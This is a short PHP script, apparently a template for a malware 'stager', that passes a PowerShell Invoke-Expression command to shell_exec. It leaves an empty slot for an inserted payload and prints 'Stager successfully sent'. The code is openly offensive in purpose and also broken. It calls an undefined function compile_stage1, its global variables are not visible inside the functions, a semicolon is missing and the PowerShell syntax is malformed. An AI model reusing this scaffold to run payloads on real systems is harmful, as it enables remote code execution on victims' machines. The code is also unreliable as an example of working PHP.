<?php
// declare global variables
$query = "";
$err = "";
  function compile_stager() {
    $init = "powershell.exe Invoke-Expression = "; // Intialization variable
    $payload = "";// Insert PowerShell payload here
    $execution_command = "shell_exec"; // Execution Variable
    $query = $execution_command("$init $payload"); // Compile the execution query
  }
  function execute_stager() {
    echo $query; // Execute query
  }
  function get_status() {
    echo "Stager successfully sent"
  }
  compile_stage1();
  execute_stager();
  get_status();
?>
